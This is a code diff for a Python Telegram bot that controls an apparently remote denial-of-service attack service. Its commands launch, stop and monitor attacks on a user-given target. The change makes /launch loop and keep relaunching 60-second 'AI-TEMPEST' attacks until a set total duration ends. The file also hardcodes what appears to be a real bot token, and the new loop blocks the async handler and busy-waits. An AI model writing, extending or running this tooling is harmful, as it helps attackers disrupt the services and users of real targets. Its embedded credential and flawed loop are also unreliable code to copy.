@@ -1,9 +1,9 @@
-import logging
 import requests
-import json
+import time
 from telegram import Update, BotCommand, InlineKeyboardButton, InlineKeyboardMarkup, ReplyKeyboardMarkup
 from telegram.ext import Application, CommandHandler, ContextTypes, MessageHandler, filters, CallbackQueryHandler
 import os
+import logging
 import threading
 from http.server import HTTPServer, BaseHTTPRequestHandler
 
@@ -26,7 +26,6 @@ def _start_health_server():
 
 _health_thread = threading.Thread(target=_start_health_server, daemon=True)
 _health_thread.start()
-
 
 # --- CONFIGURATION ---
 BOT_TOKEN = "7814912313:AAHyhW2b17XHgfcyw-26wQSKHZSpCpM9uTs"
@@ -68,15 +67,15 @@ def call_api(path: str, data: dict = None, method: str = 'GET') -> dict:
             return {"success": False, "error": f"Unsupported HTTP method: {method}"}
 
         response.raise_for_status()
-        
+
         response_data = response.json()
-        
+
         if response_data.get('success') is False:
             error_message = response_data.get('error', 'Unknown API Error')
             return {"success": False, "error": f"API Error: {error_message}"}
-            
+
         return {"success": True, "data": response_data.get('data', response_data)}
-        
+
     except requests.exceptions.HTTPError as e:
         error_msg = f"{e.response.status_code} Client Error: {e.response.reason}"
         try:
@@ -128,34 +127,49 @@ async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> No
     await update.message.reply_text(message, parse_mode='Markdown')
 
 async def launch_attack(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    if len(context.args) != 3:
+    if len(context.args) != 2:
         await update.message.reply_text(
-            "🛑 **Invalid usage.**\nFormat: `/launch <target> <time> <method>`"
+            "🛑 **Invalid usage.**\nFormat: `/launch <target> <total_duration>`"
         )
         return
 
-    target, time_str, method = context.args
+    target, total_duration_str = context.args
     try:
-        time_int = int(time_str)
+        total_duration = int(total_duration_str)
     except ValueError:
-        await update.message.reply_text("🛑 **Invalid Time.** Must be a whole number.")
+        await update.message.reply_text("🛑 **Invalid Duration.** Must be a whole number.")
         return
 
-    payload = {"target": target, "time": time_int, "method": method}
-    await update.message.reply_text(f"🚀 Attempting to launch **{method}** attack on `{target}`...", parse_mode='Markdown')
-    
-    # 🛠️ FIXED: Use POST method for launching attacks
-    response = call_api("start", data=payload, method='POST')
+    await update.message.reply_text(f"🚀 Attempting to launch attacks on `{target}` for a total of `{total_duration}` seconds...", parse_mode='Markdown')
 
-    if response["success"]:
-        message = response['data'].get('message', 'Attack launched successfully!')
-        await update.message.reply_text(f"✅ **Success!**\n\n{message}", parse_mode='Markdown')
-    else:
-        await update.message.reply_text(f"❌ **Launch Failed.**\n\n{response['error']}", parse_mode='Markdown')
+    start_time = time.time()
+    elapsed_time = 0
+
+    while elapsed_time < total_duration:
+        # Check the status to see if there are any running attacks
+        status_response = call_api("status", method='GET')
+        if status_response["success"]:
+            attack_summary = status_response["data"].get('attack_summary', {})
+            if attack_summary.get('total_running', 0) == 0:
+                # Launch a new attack
+                attack_response = call_api("start", data={"target": target, "time": 60, "method": "AI-TEMPEST"}, method='POST')
+                if attack_response["success"]:
+                    print(f"Attack launched on {target} with default time and method.")
+                else:
+                    print(f"Failed to launch attack: {attack_response['error']}")
+            else:
+                print("Waiting for the current attack to finish...")
+                time.sleep(10)  # Wait for 10 seconds before checking again
+        else:
+            print(f"Failed to check status: {status_response['error']}")
+
+        elapsed_time = time.time() - start_time
+
+    print("Total specified time has elapsed. Exiting the loop.")
 
 async def stop_attack(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     send_to = update.message or update.callback_query
-    
+
     if context.args:
         attack_id = context.args[0]
     elif update.callback_query and update.callback_query.data == 'stop_all':
@@ -164,13 +178,13 @@ async def stop_attack(update: Update, context: ContextTypes.DEFAULT_TYPE) -> Non
     else:
         await send_to.reply_text("🛑 **Invalid usage.**\nUse: `/stop <id>` or `/stop all`")
         return
-    
+
     payload = {}
     if attack_id.lower() != 'all':
         payload['attack_id'] = attack_id
-    
+
     await send_to.reply_text(f"🛑 Attempting to stop attack(s): `{attack_id}`...", parse_mode='Markdown')
-    
+
     # Stop is likely a POST action as well for safety
     response = call_api("stop", data=payload, method='POST')
 
@@ -183,12 +197,12 @@ async def stop_attack(update: Update, context: ContextTypes.DEFAULT_TYPE) -> Non
 # --- 🛠️ FIXED: STATUS COMMAND WITH CORRECT PARSING ---
 async def get_status(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     send_to = update.message or update.callback_query
-    
+
     if update.callback_query:
         await update.callback_query.answer("Refreshing status...")
 
     await send_to.reply_text("🔍 Checking status...", parse_mode='Markdown')
-    
+
     response = call_api("status", method='GET') # Status is a GET request
 
     if response["success"]:
@@ -219,7 +233,6 @@ async def get_status(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None
     else:
         await send_to.reply_text(f"❌ **Status Check Failed.**\n\n{response['error']}", parse_mode='Markdown')
 
-
 async def list_methods(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     await update.message.reply_text("🔍 Fetching available methods...")
     response = call_api("methods", method='GET')
@@ -238,7 +251,6 @@ async def list_methods(update: Update, context: ContextTypes.DEFAULT_TYPE) -> No
     else:
         await update.message.reply_text(f"❌ **Methods List Failed.**\n\n{response['error']}", parse_mode='Markdown')
 
-
 async def get_user_info(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     await update.message.reply_text("🔍 Fetching user information...")
     response = call_api("user", method='GET')
@@ -256,7 +268,6 @@ async def get_user_info(update: Update, context: ContextTypes.DEFAULT_TYPE) -> N
         await update.message.reply_text(info_text, parse_mode='Markdown')
     else:
         await update.message.reply_text(f"❌ **User Info Failed.**\n\n{response['error']}", parse_mode='Markdown')
-
 
 async def get_server_stats(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     await update.message.reply_text("🔍 Fetching server statistics...")
@@ -293,7 +304,7 @@ async def handle_menu_buttons(update: Update, context: ContextTypes.DEFAULT_TYPE
     elif text == "📈 Server Stats": await get_server_stats(update, context)
     elif text == "📊 Status Check": await get_status(update, context)
     elif text == "🚀 Launch Attack":
-        await update.message.reply_text("To launch, type the command:\n`/launch <target> <time> <method>`", parse_mode='Markdown')
+        await update.message.reply_text("To launch, type the command:\n`/launch <target> <total_duration>`", parse_mode='Markdown')
 
 async def set_bot_commands(application: Application):
     commands = [
@@ -307,7 +318,7 @@ async def set_bot_commands(application: Application):
 
 def main() -> None:
     application = Application.builder().token(BOT_TOKEN).post_init(set_bot_commands).build()
-    
+
     application.add_handler(CommandHandler(["start", "help"], start_command))
     application.add_handler(CommandHandler("launch", launch_attack))
     application.add_handler(CommandHandler("stop", stop_attack))
@@ -315,10 +326,10 @@ def main() -> None:
     application.add_handler(CommandHandler("methods", list_methods))
     application.add_handler(CommandHandler("user", get_user_info))
     application.add_handler(CommandHandler("stats", get_server_stats))
-    
+
     application.add_handler(CallbackQueryHandler(handle_callback_query))
     application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_menu_buttons))
-    
+
     logger.info("Bot started successfully...")
     application.run_polling()
 
